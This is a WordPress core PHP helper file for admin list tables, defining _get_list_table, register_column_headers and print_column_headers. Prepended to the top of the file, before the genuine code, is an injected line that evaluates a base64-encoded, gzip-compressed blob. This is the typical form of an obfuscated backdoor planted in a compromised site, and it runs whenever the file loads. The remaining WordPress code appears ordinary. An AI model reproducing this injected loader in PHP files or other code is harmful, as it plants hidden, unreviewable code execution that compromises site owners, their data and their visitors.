<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Helper functions for displaying a list of items in an ajaxified HTML table.
 *
 * @package WordPress
 * @subpackage List_Table
 * @since 3.1.0
 */

/**
 * Fetch an instance of a WP_List_Table class.
 *
 * @access private
 * @since 3.1.0
 *
 * @global string $hook_suffix
 *
 * @param string $class The type of the list table, which is the class name.
 * @param array $args Optional. Arguments to pass to the class. Accepts 'screen'.
 * @return object|bool Object on success, false if the class does not exist.
 */
function _get_list_table( $class, $args = array() ) {
	$core_classes = array(
		//Site Admin
		'WP_Posts_List_Table' => 'posts',
		'WP_Media_List_Table' => 'media',
		'WP_Terms_List_Table' => 'terms',
		'WP_Users_List_Table' => 'users',
		'WP_Comments_List_Table' => 'comments',
		'WP_Post_Comments_List_Table' => array( 'comments', 'post-comments' ),
		'WP_Links_List_Table' => 'links',
		'WP_Plugin_Install_List_Table' => 'plugin-install',
		'WP_Themes_List_Table' => 'themes',
		'WP_Theme_Install_List_Table' => array( 'themes', 'theme-install' ),
		'WP_Plugins_List_Table' => 'plugins',
		// Network Admin
		'WP_MS_Sites_List_Table' => 'ms-sites',
		'WP_MS_Users_List_Table' => 'ms-users',
		'WP_MS_Themes_List_Table' => 'ms-themes',
	);

	if ( isset( $core_classes[ $class ] ) ) {
		foreach ( (array) $core_classes[ $class ] as $required )
			require_once( ABSPATH . 'wp-admin/includes/class-wp-' . $required . '-list-table.php' );

		if ( isset( $args['screen'] ) )
			$args['screen'] = convert_to_screen( $args['screen'] );
		elseif ( isset( $GLOBALS['hook_suffix'] ) )
			$args['screen'] = get_current_screen();
		else
			$args['screen'] = null;

		return new $class( $args );
	}

	return false;
}

/**
 * Register column headers for a particular screen.
 *
 * @since 2.7.0
 *
 * @param string $screen The handle for the screen to add help to. This is usually the hook name returned by the add_*_page() functions.
 * @param array $columns An array of columns with column IDs as the keys and translated column names as the values
 * @see get_column_headers(), print_column_headers(), get_hidden_columns()
 */
function register_column_headers($screen, $columns) {
	new _WP_List_Table_Compat( $screen, $columns );
}

/**
 * Prints column headers for a particular screen.
 *
 * @since 2.7.0
 *
 * @param string|WP_Screen $screen  The screen hook name or screen object.
 * @param bool             $with_id Whether to set the id attribute or not.
 */
function print_column_headers( $screen, $with_id = true ) {
	$wp_list_table = new _WP_List_Table_Compat($screen);

	$wp_list_table->print_column_headers( $with_id );
}
